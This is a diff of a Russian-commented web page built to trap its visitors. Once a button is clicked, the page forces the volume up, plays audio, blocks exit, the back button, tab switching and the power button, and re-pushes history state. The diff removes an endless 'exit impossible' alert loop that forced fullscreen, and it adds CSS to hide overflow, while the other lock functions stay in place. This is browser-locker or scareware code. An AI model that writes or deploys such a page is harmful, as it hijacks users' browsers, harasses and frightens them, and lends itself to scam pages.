@@ -8,6 +8,12 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body, html { width: 100%; height: 100%; background: black; display: flex; justify-content: center; align-items: center; }
         #start { position: absolute; width: 100%; height: 100%; background: black; border: none; color: white; font-size: 24px; }
+        /* Скрываем полосу навигации (если поддерживается) */
+        @media (display-mode: fullscreen) {
+            body {
+                overflow: hidden;
+            }
+        }
     </style>
 </head>
 <body>
@@ -38,11 +44,9 @@
                 forceVolume();
                 audio.play().catch((error) => {
                     console.error("Ошибка воспроизведения аудио:", error);
-                    alert("Не удалось воспроизвести аудио. Разрешите автовоспроизведение в настройках браузера.");
                 });
                 button.remove();
                 blockExit();
-                startInfiniteAlert(); // Бесконечный alert запускается сразу
                 blockBackButton();
                 blockTabSwitching();
                 blockPowerButton();
@@ -81,23 +85,6 @@
                     // Возвращаем пользователя на страницу
                     window.history.pushState(null, "", window.location.href);
                 });
-            }
-
-            // Бесконечный alert()
-            function startInfiniteAlert() {
-                let alertCount = 0;
-                const showAlert = () => {
-                    alertCount++;
-                    // Проверяем, что страница в полноэкранном режиме
-                    if (!document.fullscreenElement) {
-                        document.documentElement.requestFullscreen().catch(console.error);
-                    }
-                    alert("Выход невозможен! (" + alertCount + ")");
-                    if (alertCount < 1000) { // Ограничение, чтобы избежать переполнения стека
-                        setTimeout(showAlert, 100); // Рекурсивный вызов через setTimeout
-                    }
-                };
-                showAlert(); // Запуск бесконечного alert
             }
 
             // Блокировка кнопки "Назад"
